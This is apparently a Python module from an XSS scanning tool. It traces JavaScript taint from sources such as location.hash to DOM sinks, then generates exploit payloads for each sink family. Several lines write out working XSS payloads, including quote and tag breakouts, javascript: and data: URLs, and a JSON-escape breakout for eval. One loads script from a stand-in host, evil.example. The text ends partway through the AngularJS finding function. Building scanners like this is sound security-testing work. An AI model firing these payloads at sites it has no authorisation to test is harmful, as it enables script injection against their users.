"""Static DOM analysis — source-to-sink flow detection from page JavaScript.

Two jobs:

1. **Flow analysis** (proves taint): for each *source* (`location.hash`,
   `location.search`, `document.referrer`, `window.name`, …) find whether the
   value can reach a *sink* (`innerHTML`, `eval`, `insertAdjacentHTML`,
   `$(..).html()`, `script.src`, …) through simple variable propagation.
   A source that never reaches a sink is not a finding.

2. **Fragment payload construction**: given the discovered sink, build a
   fragment payload that actually reaches execution in that sink family —
   attribute breakout for HTML-string sinks, `</script>` breakout for script
   `src` reassembly, `javascript:` for navigation sinks.
"""

from __future__ import annotations

import re
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import quote, urlparse

from intellixss.analysis.angular import (
    _angular_expression,
    angular_bootable,
    angular_sandbox_escape,
    csp_blocks_inline,
    family_rank,
)
from intellixss.models import InjectionContext, XSSFinding

# (regex, label) — taint origins
_SOURCE_PATTERNS: List[Tuple[str, str]] = [
    (r"location\.hash", "location.hash"),
    (r"\bhash\b(?!\s*=)", "location.hash"),
    (r"location\.search", "location.search"),
    (r"location\.href", "location.href"),
    (r"document\.URL", "document.URL"),
    (r"document\.documentURI", "document.documentURI"),
    (r"document\.referrer", "document.referrer"),
    (r"window\.name", "window.name"),
    (r"\.getParameter\s*\(", "URL parameter"),
    # Client-side stores: a message persisted in localStorage/IndexedDB and
    # later re-parsed as HTML is stored XSS, not reflected.
    (r"localStorage\s*\[[^\]]+\]|localStorage\.(?:getItem|setItem)\s*\(", "localStorage"),
    (r"sessionStorage\s*\[[^\]]+\]|sessionStorage\.(?:getItem|setItem)\s*\(", "sessionStorage"),
]

# (regex, label, sink family)
_SINK_PATTERNS: List[Tuple[str, str, str]] = [
    (r"\.html\s*\(", "jquery.html", "html"),
    (r"\.append\s*\(", "jquery.append", "html"),
    (r"\.prepend\s*\(", "jquery.prepend", "html"),
    # ``$(value)`` is jQuery's universal entry point: a string starting with
    # ``<`` is parsed as markup, so a tainted argument is an HTML sink even
    # though no DOM method is named. A selector-shaped taint additionally
    # reaches jQuery's selector engine, which is where extension points such
    # as ``:contains(…)`` sit.
    (r"(?<![\w$.])\$\s*\(", "jquery_selector", "html"),
    (r"\binnerHTML\s*=", "innerHTML", "html"),
    (r"insertAdjacentHTML\s*\(", "insertAdjacentHTML", "html"),
    (r"document\.write(?:ln)?\s*\(", "document.write", "html"),
    (r"\beval\s*\(", "eval", "code"),
    (r"setTimeout\s*\(\s*['\"]", "setTimeout_string", "code"),
    (r"setInterval\s*\(\s*['\"]", "setInterval_string", "code"),
    (r"\.src\s*=", "script_or_img_src", "src"),
    (r"\.href\s*=", "location_assign", "src"),
    # jQuery attribute assignment: ``$('#back').attr('href', value)`` writes the
    # same attribute as ``.href = value``, so a ``javascript:`` value executes
    # when the element is followed. Matching only the DOM form misses it.
    (r"\.attr\s*\(\s*['\"](?:href|action|src|formaction)['\"]", "jquery_attr_url", "src"),
    (r"location\.assign\s*\(", "location.assign", "src"),
    (r"document\.location\s*=", "location_assign", "src"),
    # Elements whose URL attribute is set from a source. A ``javascript:`` value
    # in any of them executes when the browser follows it.
    (r"\.action\s*=", "form_action", "src"),
    (r"\.formaction\s*=", "form_action", "src"),
    (r"(?:iframe|frame)\.src\s*=", "frame_src", "src"),
    # The strongest DOM-XSS sink: a *stored* value re-parsed as an inline
    # handler. Trusting it is what makes level-4-style bugs exploitable.
    (r"\.on\w+\s*=", "inline_handler_assign", "html"),
    (r"\bsetAttribute\s*\(\s*['\"]on", "setAttribute_on", "html"),
    (r"\bFunction\s*\(", "Function_ctor", "code"),
]

_HTML_SINKS = {"jquery.html", "jquery.append", "jquery.prepend", "innerHTML",
               "insertAdjacentHTML", "document.write", "setAttribute_on",
               "jquery_selector"}
_SRC_SINKS = {"script_or_img_src", "location_assign", "location.assign",
              "form_action", "frame_src", "jquery_attr_url"}
# Sinks whose value is a URL the browser will follow: a ``javascript:`` payload
# executes on submit/navigation, while markup is inert there.
_URL_FOLLOW_SINKS = {"form_action", "frame_src", "location.assign", "jquery_attr_url"}
_CODE_SINKS = {"eval", "setTimeout_string", "setInterval_string"}


# ----------------------------------------------------------------------
# flow analysis
# ----------------------------------------------------------------------


def _scripts(html: str, external: Optional[List[str]] = None) -> List[str]:
    """Inline script bodies, plus any external bodies the caller fetched.

    A sink rarely lives in the document anymore: ``searchResults.js`` holds
    ``eval('var o = ' + responseText)`` and the page only names it in a
    ``src=``. Inline-only analysis therefore reports such a page as having no
    flow at all. The caller fetches the page's own scripts and passes them in;
    the default stays inline-only so existing callers keep their behaviour.
    """
    if not html:
        return list(external or [])
    out: List[str] = []
    for m in re.finditer(r"<script\b([^>]*)>(.*?)</script>", html, re.I | re.S):
        if "src=" in m.group(1).lower():
            continue
        body = m.group(2)
        if body.strip():
            out.append(body)
    for body in external or []:
        if body and body.strip():
            out.append(body)
    return out


_FUNC_DEF = re.compile(
    r"function\s+([A-Za-z_$][\w$]*)\s*\(([^)]*)\)\s*\{", re.S
)


def _match_brace(js: str, open_idx: int) -> int:
    """Return index of the ``}`` matching the ``{`` at *open_idx* (or -1).

    A tiny lexer: strings ('…', "…", `…`) and ``//``/``/* */`` comments are
    skipped so braces inside them cannot unbalance the match.
    """
    depth = 0
    i = open_idx
    n = len(js)
    while i < n:
        ch = js[i]
        if ch in "'\"`":
            quote = ch
            i += 1
            while i < n:
                if js[i] == "\\":
                    i += 2
                    continue
                if js[i] == quote:
                    break
                i += 1
        elif ch == "/" and i + 1 < n and js[i + 1] == "/":
            nl = js.find("\n", i)
            i = n if nl == -1 else nl
        elif ch == "/" and i + 1 < n and js[i + 1] == "*":
            end = js.find("*/", i + 2)
            i = n if end == -1 else end + 1
        elif ch == "{":
            depth += 1
        elif ch == "}":
            depth -= 1
            if depth == 0:
                return i
        i += 1
    return -1


def _split_args(js: str, open_paren: int, limit: int = 400) -> List[str]:
    """Split arguments of a call whose ``(`` ends at *open_paren*."""
    depth = 1
    args: List[str] = []
    cur: List[str] = []
    i = open_paren
    n = min(len(js), open_paren + limit)
    while i < n:
        ch = js[i]
        if ch in "'\"`":
            quote = ch
            cur.append(ch)
            i += 1
            while i < n:
                cur.append(js[i])
                if js[i] == "\\":
                    i += 1
                    if i < n:
                        cur.append(js[i])
                elif js[i] == quote:
                    break
                i += 1
        elif ch == "(":
            depth += 1
            cur.append(ch)
        elif ch == ")":
            depth -= 1
            if depth == 0:
                break
            cur.append(ch)
        elif ch == "," and depth == 1:
            args.append("".join(cur).strip())
            cur = []
        else:
            cur.append(ch)
        i += 1
    tail = "".join(cur).strip()
    if tail:
        args.append(tail)
    return args


def _functions(js: str) -> Dict[str, Tuple[List[str], str]]:
    """Map function name -> (parameter names, body)."""
    out: Dict[str, Tuple[List[str], str]] = {}
    for m in _FUNC_DEF.finditer(js):
        name = m.group(1)
        params = [p.strip() for p in m.group(2).split(",") if p.strip()]
        open_idx = m.end() - 1
        close_idx = _match_brace(js, open_idx)
        if close_idx == -1:
            continue
        out[name] = (params, js[open_idx + 1 : close_idx])
    return out


def _tainted_vars(js: str, rounds: int = 6) -> Dict[str, str]:
    """
    Map variable/parameter name -> source label.

    Taint is propagated to a fixed point so chains like
    ``hash -> getGadgetName() -> url (param) -> scriptEl.src`` are followed:
    a function whose body contains a tainted parameter or a tainted local is
    itself tainted, and passing a tainted value to it taints the parameter
    at every call site.
    """
    funcs = _functions(js)
    out: Dict[str, str] = {}

    def _name_taint(text: str, scope: Dict[str, str]) -> Optional[str]:
        for pat, label in _SOURCE_PATTERNS:
            if re.search(pat, text):
                return label
        for var, label in scope.items():
            if re.search(rf"\b{re.escape(var)}\b", text):
                return label
        return None

    for _ in range(rounds):
        before = len(out)

        # 1) locals assigned from a source:  var x = location.hash.substr(1)
        for pat, label in _SOURCE_PATTERNS:
            for m in re.finditer(
                rf"(?:var|let|const)\s+([A-Za-z_$][\w$]*)\s*=\s*[^;\n]*{pat}", js
            ):
                out.setdefault(m.group(1), label)
        # A bare assignment only taints a *local*: ``window.name = …`` assigns
        # to a property, and treating it as a variable would poison the map
        # with a missing group.
        for pat, label in _SOURCE_PATTERNS:
            for m in re.finditer(
                rf"(?<![.\w$])([A-Za-z_$][\w$]*)\s*=\s*[^=;\n][^;\n]*{pat}", js
            ):
                out.setdefault(m.group(1), label)

        # 2) functions returning / forwarding a tainted value become "name()"
        for fname, (params, body) in funcs.items():
            scope = {p: out[p] for p in params if p in out}
            scope.update(
                {k: v for k, v in out.items() if isinstance(k, str) and not k.endswith("()")}
            )
            label = _name_taint(body, scope)
            if label:
                out.setdefault(f"{fname}()", label)

        # 2b) XHR responses carry the taint of the URL they requested.
        # ``xhr.open('GET', path + location.search)`` sends a URL the attacker
        # controls, and ``this.responseText`` in the handler is that response.
        # Without this step a flow that travels through the network
        # (source → request URL → response → eval) looks like two unrelated
        # statements and the sink is never connected to the source.
        if re.search(r"XMLHttpRequest|fetch\s*\(", js):
            request_taint: Optional[str] = None
            for m in re.finditer(r"\.open\s*\(", js):
                args = _split_args(js, m.end())
                for arg in args:
                    label = _name_taint(arg, out)
                    if label:
                        request_taint = label
                        break
                if request_taint:
                    break
            if request_taint:
                for resp in ("responseText", "response"):
                    out.setdefault(resp, request_taint)
                # ``var xhr = new XMLHttpRequest()`` is the same object whose
                # response the handler reads; naming it keeps the chain visible
                # to callers that look at the response handle.
                for m in re.finditer(
                    r"(?:var|let|const)\s+([A-Za-z_$][\w$]*)\s*=\s*new\s+XMLHttpRequest",
                    js,
                ):
                    out.setdefault(m.group(1), request_taint)

        # 3) call sites: includeGadget(getGadgetName()) taints `url`
        for fname, (params, _body) in funcs.items():
            call_re = re.compile(rf"\b{re.escape(fname)}\s*\(")
            for cm in call_re.finditer(js):
                before = js[max(0, cm.start() - 12) : cm.start()]
                if before.rstrip().endswith("function"):
                    continue  # the definition itself, not a call
                args = _split_args(js, cm.end())
                for idx, arg in enumerate(args):
                    label: Optional[str]
                    if arg.endswith("()") and arg in out:
                        label = out[arg]
                    elif re.fullmatch(r"[A-Za-z_$][\w$]*", arg) and arg in out:
                        label = out[arg]
                    else:
                        label = _name_taint(arg, out)
                    if label and idx < len(params):
                        out.setdefault(params[idx], label)

        # 4) assignment propagation: a = tainted_b
        for name, label in list(out.items()):
            if not isinstance(name, str):
                continue
            base = name[:-2] if name.endswith("()") else name
            for m in re.finditer(
                rf"(?:var|let|const)\s+([A-Za-z_$][\w$]*)\s*=\s*[^;\n]*\b{re.escape(base)}\b",
                js,
            ):
                out.setdefault(m.group(1), label)

        if len(out) == before:
            break
    # Invariant: every key is a real identifier. A regex that miscaptured must
    # never leak a None into downstream callers that assume ``str``.
    return {k: v for k, v in out.items() if isinstance(k, str) and k}


def _sink_window(js: str, sink_pos: int) -> str:
    """Source text a sink is judged against: its call arguments plus context.

    Sinks are called with their data, so the argument list is the primary
    evidence. A fixed-width window around the sink name misses
    ``document.write('<img …>' + query)`` because the tainted identifier sits
    after the match, and widening blindly would pull in unrelated statements.
    """
    head = js[max(0, sink_pos - 220) : sink_pos]
    # Walk to the closing paren of the call, honouring nested parens and quotes.
    depth = 0
    quote = ""
    i = sink_pos
    end = min(len(js), sink_pos + 400)
    while i < end:
        ch = js[i]
        if quote:
            if ch == "\\":
                i += 2
                continue
            if ch == quote:
                quote = ""
        elif ch in "'\"`":
            quote = ch
        elif ch == "(":
            depth += 1
        elif ch == ")":
            depth -= 1
            if depth == 0:
                i += 1
                break
        i += 1
    return head + js[sink_pos : max(i, sink_pos + 60)]


def analyze_dom_flows(
    html: str, external_js: Optional[List[str]] = None
) -> List[Tuple[str, str, str]]:
    """
    Return ``[(source, sink, family)]`` triples for sources that can reach a
    sink — either inline, or through a tainted variable used at the sink.

    *external_js* carries the bodies of the page's own ``<script src=…>``
    files; without them a page whose sink lives in a bundled script looks like
    it has no flow at all.
    """
    js = "\n".join(_scripts(html, external_js))
    if not js:
        return []

    tainted = _tainted_vars(js)
    flows: List[Tuple[str, str, str]] = []

    present_sources = [label for pat, label in _SOURCE_PATTERNS if re.search(pat, js)]
    if not present_sources and not tainted:
        return []

    for pat, sink, family in _SINK_PATTERNS:
        for m in re.finditer(pat, js):
            # The window has to cover the sink's own argument list, not a fixed
            # byte count: ``document.write('<img …' + query)`` puts the tainted
            # identifier *after* the sink name, and a taint that only appears in
            # the argument is still a taint that reaches the sink.
            window = _sink_window(js, m.start())
            # direct: location.hash used at the sink itself
            direct = next(
                (label for sp, label in _SOURCE_PATTERNS if re.search(sp, window)), None
            )
            if direct:
                flows.append((direct, sink, family))
                continue
            # via variable: any tainted var name appears in the sink window
            via = next(
                (src for var, src in tainted.items() if re.search(rf"\b{re.escape(var)}\b", window)),
                None,
            )
            if via:
                flows.append((via, sink, family))

    flows.extend(_concat_flows(js))

    # de-duplicate, keep order
    seen = set()
    out = []
    for f in flows:
        if f in seen:
            continue
        seen.add(f)
        out.append(f)
    return out


def _concat_flows(js: str) -> List[Tuple[str, str, str]]:
    """Flows where a tainted value is *concatenated* into HTML, then assigned
    to a DOM sink.

    The common pattern is::

        var html = '<b>' + posts[i].message + '</b>';
        containerEl.innerHTML += html;

    No single window contains the source *and* the sink, so the linear scan in
    :func:`analyze_dom_flows` misses it. Here the strings that are built by
    concatenation and later written to an HTML sink are collected, and any
    tainted value appended to them counts as reaching that sink.
    """
    # Names assigned an HTML sink: el.innerHTML += html / innerHTML = html
    sink_targets: Dict[str, str] = {}
    for m in re.finditer(
        r"([A-Za-z_$][\w$]*)\s*\.\s*(innerHTML|outerHTML)\s*\+?=\s*"
        r"([A-Za-z_$][\w$]*)",
        js,
    ):
        sink_targets[m.group(3)] = m.group(2)
    for m in re.finditer(
        r"([A-Za-z_$][\w$]*)\s*\.\s*(innerHTML|outerHTML)\s*=\s*"
        r"'([^']*)'\s*\+\s*([A-Za-z_$][\w$]*)",
        js,
    ):
        sink_targets.setdefault(m.group(4), m.group(2))
    for m in re.finditer(
        r"\$\([^)]*\)\s*\.(?:html|append|prepend)\s*\(\s*([A-Za-z_$][\w$]*)",
        js,
    ):
        sink_targets.setdefault(m.group(1), "jquery.html")

    out: List[Tuple[str, str, str]] = []
    if not sink_targets:
        return out

    convolved = set(sink_targets)
    # html += expr  — the string grows through more concatenations
    for m in re.finditer(r"\b([A-Za-z_$][\w$]*)\s*\+=", js):
        convolved.add(m.group(1))

    # a = '...' + html  — assign a literal prefix at the *start* of a statement.
    # One alternation is tried per convolved name, so the pattern is compiled
    # once per name and bounded to a single statement: an unbounded ``[^;]``
    # under ``re.S`` backtracks catastrophically on a minified bundle.
    for _ in range(4):
        grew = False
        for name in list(convolved):
            assign_re = re.compile(
                rf"(?:^|[;{{}}\n])[ \t]*(?:var|let|const)?\s*([A-Za-z_$][\w$]*)\s*=\s*"
                rf"[^;=][^;]{{0,600}}\b{re.escape(name)}\b(?!\s*(?:\.|\[))",
                re.S,
            )
            for m in assign_re.finditer(js):
                if m.group(1) not in convolved:
                    convolved.add(m.group(1))
                    grew = True
        if not grew:
            break

    # The taint set is global to the script: computing it once costs one pass,
    # while recomputing it per statement was quadratic — on a minified bundle it
    # was the single slowest step of a scan by two orders of magnitude.
    tainted = _tainted_vars(js)

    for name in convolved:
        sink = sink_targets.get(name)
        if not sink:
            continue
        # every statement that builds `name`
        for m in re.finditer(
            rf"\b{re.escape(name)}\s*(?:\+=|=)[^;]{{0,600}}", js, re.S
        ):
            built = m.group(0)
            for pat, label in _SOURCE_PATTERNS:
                if re.search(pat, built):
                    out.append((label, sink, "html"))
            for var, src in tainted.items():
                if re.search(rf"\.\s*{re.escape(var)}\b", built):
                    out.append((src, sink, "html"))

    seen = set()
    deduped = []
    for f in out:
        if f in seen:
            continue
        seen.add(f)
        deduped.append(f)
    return deduped


def probe_leak_flows(js: str) -> List[Tuple[str, str, str]]:
    """Flows where a *filtered* value is written back into a DOM sink.

    A page that echoes a parameter through an HTML-encoding filter and then
    assigns the buffered response to ``innerHTML`` mounts attacker markup
    client-side even though the HTTP response itself is encoded — the classic
    "sanitised on the server, re-parsed in the browser" bug.

    Returns ``[(source, sink, family)]`` with the source labelled after the
    echo variable it originates from (``POST echo`` etc.).
    """
    sinks = _sink_targets(js)
    if not sinks:
        return []

    out: List[Tuple[str, str, str]] = []
    for target, sink, family in sinks:
        if sink not in ("innerHTML", "outerHTML", "jquery.html"):
            continue
        # target is built from string concatenation of HTML fragments
        built_from_markup = False
        for m in re.finditer(
            rf"\b{re.escape(target)}\s*(?:\+=|=)[^;]{{0,800}}", js, re.S
        ):
            if re.search(r"<[a-zA-Z/!]", m.group(0)):
                built_from_markup = True
                break
        if not built_from_markup:
            continue
        # ... and the value is read from a fetch response or an echo buffer
        reads_echo = re.search(
            rf"\b{re.escape(target)}\s*=\s*(?:[\w$.]+\s*\+)[^;]{{0,200}}"
            rf"(?:responseText|innerText|textContent|\.response|\becho)",
            js,
        )
        if not reads_echo:
            continue
        out.append(("filtered echo", sink, family))
    return out


def append_flows(html: str) -> List[Tuple[str, str, str]]:
    """Taint reaching an HTML sink through concatenation from a *store*.

    Covers the chatter pattern (level 2)::

        html += "<blockquote>" + posts[i].message + "</blockquote>";
        containerEl.innerHTML += html;

    The value written to ``innerHTML`` is user content persisted by the page's
    own store, so the source is labelled ``storage`` unless the concatenation
    really involves a URL-controlled source (then the specific label wins).
    """
    scripts = _scripts(html)
    if not scripts:
        return []
    js = "\n".join(scripts)

    out: List[Tuple[str, str, str]] = []
    for target, sink, family in _sink_targets(js):
        for prop in _concatenated_props(js, target):
            if prop in ("length", "date", "id", "name"):
                continue
            source = "storage"
            out.append((source, sink, family))
            break
        else:
            continue
        break
    return out


def _sink_targets(js: str) -> List[Tuple[str, str, str]]:
    """``[(variable, sink, family)]`` where *variable* is written to a sink."""
    found: List[Tuple[str, str, str]] = []
    for m in re.finditer(
        r"([A-Za-z_$][\w$]*)\s*\.\s*(innerHTML|outerHTML)\s*\+?=\s*"
        r"([A-Za-z_$][\w$]*)",
        js,
    ):
        found.append((m.group(3), m.group(2), "html"))
    for m in re.finditer(
        r"([A-Za-z_$][\w$]*)\s*\.\s*innerHTML\s*=\s*'[^']*'\s*\+\s*([A-Za-z_$][\w$]*)",
        js,
    ):
        found.append((m.group(2), "innerHTML", "html"))
    for m in re.finditer(
        r"\$\([^)]*\)\s*\.(?:html|append|prepend)\s*\(\s*([A-Za-z_$][\w$]*)",
        js,
    ):
        found.append((m.group(1), "jquery.html", "html"))
    return found


def _concatenated_props(js: str, target: str) -> List[str]:
    """Properties appended to *target* while it is built by concatenation."""
    props: List[str] = []

    def scan(text: str) -> None:
        for m in re.finditer(r"\+\s*[A-Za-z_$][\w$\[\]]*\s*\.\s*([A-Za-z_$][\w$]*)", text):
            if m.group(1) not in props:
                props.append(m.group(1))

    for m in re.finditer(rf"\b{re.escape(target)}\s*(?:\+=|=)[^;]{{0,800}}", js, re.S):
        scan(m.group(0))
    # html = '...'  then html += '...'  — scan every += block once
    for m in re.finditer(r"([A-Za-z_$][\w$]*)\s*\+=[^;]{0,800}", js, re.S):
        if m.group(1) == target:
            scan(m.group(0))
    return props


def store_roundtrip_flows(html: str) -> List[Tuple[str, str, str, str]]:
    """Public alias used by the stored-XSS plugin."""
    """Stored-XSS flows: browser store → HTML sink.

    Pattern (level-2 style chatter)::

        DB.save(message)                 // persists user input
        var posts = DB.getPosts();       // reads it back
        html += posts[i].message;        // concatenated into markup
        containerEl.innerHTML += html;   // parsed as HTML

    Returns ``[(source, sink, family, field_name)]`` where ``field_name`` is
    the JSON property carrying the user content, so the caller can drive the
    right form field instead of guessing.
    """
    scripts = _scripts(html)
    if not scripts:
        return []
    js = "\n".join(scripts)

    has_store = re.search(r"localStorage|sessionStorage|indexedDB", js) or re.search(
        r"\b\w+\.(?:save|add|push|store|setItem)\s*\(", js
    )
    # A chatter page may delegate persistence to an external store script
    # (post-store.js); the concatenation pattern itself is then the signal.
    if not has_store and not re.search(r"""\+\s*"[^"]*"|\+\s*'[^']*'""", js):
        return []

    flows = analyze_dom_flows(html) + append_flows(html)
    html_sink = next((f for f in flows if f[2] == "html"), None)
    if not html_sink:
        return []

    # Property appended to the built markup: + posts[i].message + ...
    fields: List[str] = []
    for m in re.finditer(r"\+\s*[A-Za-z_$][\w$\[\]]*\s*\.\s*([A-Za-z_$][\w$]*)", js):
        name = m.group(1)
        if name in ("length", "date", "id"):
            continue
        if name not in fields:
            fields.append(name)

    source = "storage" if re.search(r"Storage|indexedDB", js) else html_sink[0]
    return [(source, html_sink[1], "html", f) for f in fields]


def analyze_dom_sources_sinks(html: str) -> List[Tuple[str, str]]:
    """Back-compat wrapper: ``[(source, sink)]`` for confirmed flows only."""
    return sorted({(s, k) for s, k, _ in analyze_dom_flows(html)})


# ----------------------------------------------------------------------
# payload construction per sink family
# ----------------------------------------------------------------------


def _payload_candidates(
    family: str, sink: str, js: str = "", source: str = ""
) -> List[Tuple[str, str]]:
    """Ordered ``(payload, rationale)`` candidates for the fragment at *sink*.

    The first entry is the most likely to fire; the orchestrator walks the rest
    in the browser when it does not. Fragment values are URI-decoded by the
    browser, so markup is *not* injectable through ``location.hash`` — the
    exploit has to survive as a URL the page hands to the sink.
    """
    if sink == "script_or_img_src" and re.search(r"createElement\s*\(\s*['\"]script", js):
        # A gadget loader: the fragment becomes the src of a freshly created
        # <script>. The payload is a *script URL*, not markup: data: URIs keep
        # the code inline and need no attacker-controlled host.
        return [
            (
                "data:text/javascript,alert(1)",
                "fragment is assigned to a dynamically created script.src; "
                "a data: URL supplies the script body directly",
            ),
            (
                "//evil.example/xss.js",
                "fragment is assigned to script.src; a protocol-relative URL "
                "loads attacker-controlled script once such a gadget exists",
            ),
        ]
    if family == "src" or sink in _SRC_SINKS:
        if sink in _URL_FOLLOW_SINKS:
            return [
                (
                    "javascript:alert(1)",
                    "fragment is assigned to a URL the browser follows; "
                    "javascript: URLs execute on navigation/submit",
                ),
                (
                    "data:text/html,<script>alert(1)</script>",
                    "data: URL executes for sinks that refuse javascript:",
                ),
            ]
        if sink == "script_or_img_src":
            return [
                (
                    "</script><svg/onload=alert(1)>",
                    "breaks out of the reassembled <script> element; "
                    "src becomes a new tag",
                )
            ]
        return [("javascript:alert(1)", "fragment is assigned to location")]
    if family == "html" and source in ("location.search", "URL parameter"):
        # What survives ``location.search`` is not one thing — it depends on
        # what the page does with the value.
        #
        # An attribute-builder (``document.write('<img src="/t.gif?s=' + v)``)
        # receives the value verbatim, but the browser has percent-encoded
        # ``<`` and ``>`` on the way in when the attacker types them in a query
        # string, so a tag cannot be opened and only the quote can be closed.
        # ``onload`` leads: the page's element points at a resource that loads,
        # so an ``onerror`` handler installs cleanly and then stays silent.
        #
        # A tag-builder (``document.write('<option>' + v)``) is different: the
        # value reaches the parser *unescaped*, and the payload's job is to
        # close the element that contains it. ``<select>`` is the case that
        # matters — it swallows every element except ``option`` and
        # ``optgroup``, so only an explicit ``</select>`` frees the markup.
        # Both families are offered; ranking is decided by the browser.
        return [
            (
                'x"%09onload%3D"alert(1)"%09x="',
                "location.search keeps quotes, '=' and tab; closing the value "
                "attribute lets the page's own element gain an onload handler, "
                "which fires because its resource loads",
            ),
            (
                "</select><svg%20onload%3Dalert(1)>",
                "closes a <select> the page is inside and opens a self-firing "
                "element; <select> rejects every child except <option>",
            ),
            (
                'x"%09onerror%3D"alert(1)"%09x="',
                "onerror variant, for elements whose resource genuinely fails",
            ),
            (
                "x'%09onload%3D'alert(1)'%09x='",
                "single-quoted attribute variant, for pages that build the tag "
                "with apostrophes",
            ),
            (
                'x"%0Aonload%3D"alert(1)"%0Ax="',
                "newline-separated variant, for tokenizers that reject tab",
            ),
        ]
    if sink == "jquery_selector":
        # The value is a CSS selector handed to jQuery, not markup. jQuery's
        # Sizzle engine parses ``:xxx(…)`` as a pseudo-selector, and versions
        # before 3.0 expose ``:has()`` with an expression that is compiled, so
        # the payload has to be a syntactically valid selector with an
        # execution primitive where the expression goes — a tag would simply
        # match nothing and be discarded.
        return [
            (
                "x:has(<img src=x onerror=alert(1)>)",
                "fragment is consumed as a CSS selector; jQuery's :has() "
                "compiles its argument, so the selector carries the payload",
            ),
            (
                "x:has(<svg onload=alert(1)>)",
                "same selector primitive with a self-firing element",
            ),
            (
                "img onerror=alert(1)",
                "fallback: selector context that tolerates bare markup",
            ),
        ]
    if family == "code" or sink in _CODE_SINKS:
        # An ``eval`` fed by a server response is not evaluating our text — it
        # is evaluating a *document* that embeds our text in a JSON string. The
        # server escapes ``"`` as ``\"``, so the source the interpreter sees
        # holds ``\"`` where the string should end and one backslash is exactly
        # what is needed to close it. The object literal still has to be closed
        # before a statement is legal, hence ``};`` and then ``//`` to drop the
        # trailing JSON. Payloads that assume raw concatenation (a bare
        # ``alert(1)``) are inert here: they never leave the string.
        if re.search(r"\beval\s*\([^)]*response", js) or re.search(
            r"\beval\s*\([^)]*JSON\.parse", js
        ):
            return [
                (
                    '\\"};alert(1);//',
                    "the eval'd source is a JSON response embedding the value in "
                    "a string; the server escapes the quote, so `\\\"` closes the "
                    "string, `}` closes the object and the rest is commented out",
                ),
                (
                    '\\",x:alert(1),"y:"',
                    "same escape, keeping the object valid so the page's own "
                    "handler still receives a parsed result",
                ),
                ("alert(1)", "fallback: evaluated as bare code"),
            ]
        return [("alert(1)", "fragment is evaluated as code by the sink")]
    # html family: the page builds an element from a single-quoted attribute
    # (``<img src='FRAGMENT'>``). Breaking the quote alone is not enough: the
    # handler that would carry our code never gets a firing event, so the
    # payload must close the attribute *and* the tag, then open its own.
    return [
        (
            "'><img src=x onerror=alert(1)>",
            "closes the attribute and tag the page builds around the fragment, "
            "then injects an element whose handler fires",
        ),
        (
            "1'><svg/onload=alert(1)>",
            "same breakout with an SVG onload, for pages that filter <img>",
        ),
        (
            "1' onerror='alert(1)",
            "adds an onerror handler to the element the page builds; only fires "
            "when that element ever errors",
        ),
    ]


def _payload_for(family: str, sink: str) -> Tuple[str, str]:
    """Return the primary ``(payload, rationale)`` for *sink*."""
    return _payload_candidates(family, sink)[0]


def fragment_dom_finding(
    url: str, html: str, marker: str = "", external_js: Optional[List[str]] = None
) -> Optional[XSSFinding]:
    """
    Emit a DOM XSS finding **only** when a source demonstrably reaches a sink.
    Confirmation is static (browser replay is attempted by the orchestrator).
    """
    flows = analyze_dom_flows(html, external_js)
    if not flows:
        return None

    hash_flows = [f for f in flows if f[0] in ("location.hash", "URL parameter")]
    chosen = hash_flows or flows

    # Prefer a sink the browser can actually follow (an execution primitive)
    # over one that only reassembles markup, then the most exploitable family.
    # A page often taints both ``iframe.src`` and a generic ``.src``; ranking by
    # family alone would pick the inert one and advertise a payload that can
    # never fire.
    #
    # ``code`` outranks ``html``: an eval'd source runs the value directly,
    # while an html sink still has to get past the parser. Ranking by the
    # breadth of the family name picked ``inline_handler_assign`` (an
    # occurrence of ``.on<event> =`` that is really the XHR callback being
    # assigned) over the ``eval`` that consumes the response.
    rank = {"src": 3, "code": 2, "html": 1}

    def _rank(flow) -> tuple:
        _src, sink, family = flow
        if sink in _URL_FOLLOW_SINKS:
            return (2, rank.get(family, 0))
        return (1 if family == "code" else 0, rank.get(family, 0))

    source, sink, family = max(chosen, key=_rank)

    js = "\n".join(_scripts(html, external_js))
    candidates = _payload_candidates(family, sink, js, source)
    # Every candidate carries the marker: the orchestrator walks this ladder in
    # the browser and a candidate without the marker cannot prove execution.
    candidates = [(_mark_payload(p, marker), why) for p, why in candidates]
    payload, rationale = candidates[0]
    storage_flows = [f for f in flows if f[0] in ("localStorage", "sessionStorage")]
    vuln_type = "stored_dom" if storage_flows and not hash_flows else "dom"
    sinks = sorted({s for _, s, _ in chosen})
    evidence = (
        f"DOM taint: {source} reaches sink(s) {sinks} "
        f"(chosen: {sink}); {rationale}"
    )
    return XSSFinding(
        url=f"{url.split('#')[0]}#{payload}",
        parameter="#fragment",
        method="GET",
        context=InjectionContext.URL_FRAGMENT,
        payload=payload,
        evidence=evidence,
        browser_confirmed=False,
        impact="high",
        vulnerability_type=vuln_type,
        confidence=0.85,
        marker=marker,
        payload_candidates=[p for p, _ in candidates],
    )


def angular_template_finding(
    url: str,
    html: str,
    marker: str = "",
    parameter: str = "q",
    headers: Dict[str, str] | None = None,
) -> Optional[XSSFinding]:
    """AngularJS template injection: the payload lands inside a compiled subtree.

    Angular compiles the subtree of its root element, so a ``{{…}}`` expression
    reflected into that subtree is *evaluated*, not printed — even though the
    HTML is completely inert. That is why this cannot be found by reflection
    analysis: the sink is a parser, not a tag.

    "Compiled subtree" is not spelled ``ng-app``. An app bootstrapped from
    script, or a template hung off ``ng-controller``, compiles just as well with
    no ``ng-app`` anywhere; reading only that attribute reports "no AngularJS"
    on a page that is entirely Angular. What the page *exposes* then decides
    which escape is worth trying — a ``self``-only CSP removes ``Function`` from
    reach entirely, so the event-object family is the only one that can fire.

    The expression is a *candidate* until the browser runs it: whether it escapes
    the sandbox depends on the Angular version and on what the page exposes. The
    caller confirms it like any other DOM flow rather than trusting the version
    banner, and only falls back to a static report when no dialog is observed.
    """
    if not html:
        return None
    boot = angular_bootable(html)
    if not boot:
        return None
    compilers = re.findall(r"<script[^>]+src=[\"']([^\"']*angular[^\"']*)[\"']", html, re.I)
    if not compilers and "angular.bootstrap" not in html:
        return None

    version = ""
    vm = re.search(r"angular(?:js|)[._/-]?v?(\d+\.\d+\.\d+)", " ".join(compilers), re.I)
    if vm:
        version = vm.group(1)

    # ``alert(1)`` is the placeholder the marker is substituted into. The marker
    # goes inside a *double*-quoted JS string nested in a single-quoted one:
    # Angular compiles the expression, so the inner call needs a real JS string
    # literal. A backtick template does not work here — Angular parses it as its
    # own expression syntax and the call never reaches ``Function``, which is
    # why a backtick candidate is reported as evaluated but stays silent.
    families = angular_sandbox_escape(html, headers)
    if not families:
        return None
